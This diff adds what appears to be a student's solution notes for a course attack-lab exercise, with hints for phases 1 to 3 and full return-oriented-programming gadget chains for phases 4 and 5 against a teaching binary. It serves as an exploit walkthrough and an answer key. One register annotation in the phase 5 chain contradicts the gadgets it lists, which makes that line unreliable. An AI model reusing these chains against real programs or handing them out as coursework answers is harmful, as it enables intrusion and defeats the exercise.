@@ -1,0 +1,78 @@
+phase1: quite simple.
+phase2: note that the program counter will be set to the next address before executing ret.
+phase3: just put the cookie string above or below the current stack frame, so it will be unaffected.
+phase4: note that farm starts from line 915 to 1097
+        you can insert cookie directly after popq %rax, so it will be popped out.
+
+        00000000004019a7 <addval_219>:
+        4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
+        4019ad:	c3                   	retq
+
+        gadget 1 address: 0x4019ab
+        58 popq %rax
+        90 nop
+        c3 ret
+
+        00000000004019a0 <addval_273>:
+        4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax
+        4019a6:	c3                   	retq
+
+        gadget 2 address: 0x4019a2
+        48 89 c7 mov %rax,%rdi
+        c3       ret
+
+phase5: the core is getting the address of the cookie string.
+
+        0000000000401a03 <addval_190>:
+        401a03: 8d 87 41 48 89 e0     lea    -0x1f76b7bf(%rdi),%eax
+        401a09: c3  
+
+        gadget 1 address: 0x401a06
+        48 89 e0 movq %rsp,%rax
+        c3       ret
+
+        gadget 2 address: 0x4019a2 (copied from phase4)
+        48 89 c7 mov %rax,%rdi
+        c3       ret
+
+        gadget 3 address: 0x4019ab (copied from phase4)
+        58 popq %rax
+        90 nop
+        c3 ret
+
+        gadget 4 address: 0x4019dd
+        movl %eax, %edx
+        ret
+
+        gadget 5 address: 0x401a70
+        movl %edx, %ecx
+        ret
+
+        gadget 6 address: 0x401a13
+        movl %ecx, %esi
+        ret
+
+        gadget 7 address: 0x4019d6
+        lea    (%rdi,%rsi,1),%rax
+        ret
+
+        gadget 8 address: 0x401a13
+        movl %ecx, %esi
+        ret
+
+        gadget 9 address: 0x4019a2 (copied from phase4)
+        48 89 c7 mov %rax,%rdi
+        c3       ret
+
+        all steps:
+        0x401a06        movq %rsp,%rax
+        0x4019a2        mov  %rax,%rdi
+        0x4019ab        popq %rax
+        0x48                                     (9 instructions 9*8 == 72 == 0x48)
+        0x4019dd        movl %eax,%edx
+        0x401a70        movl %edx,%ecx
+        0x401a13        movl %ecx,%esi
+        0x4019d6        lea  (%rdi,%rsi,1),%rax  (%rdi stores 0x48 the offset, %rsi stores %rsp)
+        0x4019a2        mov  %rax,%rdi
+        0x4018fa        <touch3>
+        cookie string                            (exactly %rsp + 0x48)
